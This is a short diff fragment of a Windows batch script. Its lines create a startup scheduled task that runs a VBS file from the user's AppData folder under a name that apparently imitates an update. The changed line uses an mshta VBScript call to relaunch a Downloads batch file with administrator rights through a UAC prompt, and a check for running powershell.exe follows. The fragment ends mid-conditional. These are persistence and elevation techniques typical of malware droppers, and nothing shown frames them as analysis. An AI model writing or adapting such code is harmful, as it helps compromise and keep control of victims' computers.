@@ -8,7 +8,7 @@ SCHTASKS /CREATE /TR C:\Users\puncher\AppData\Roaming\1.vbs /SC ONSTART /TN Upde
 pause>nul
 exit /b
 :UACPrompt
-mshta "vbscript:CreateObject("Shell.Application").ShellExecute("~fs0", "", "", "runas", 1) & Close()"
+mshta "vbscript:CreateObject("Shell.Application").ShellExecute("C:\Users\al\Downloads\script.bat", , , "runas", 1) & Close()"
 tasklist
 find "powershell.exe"
 if errorlevel 1 (
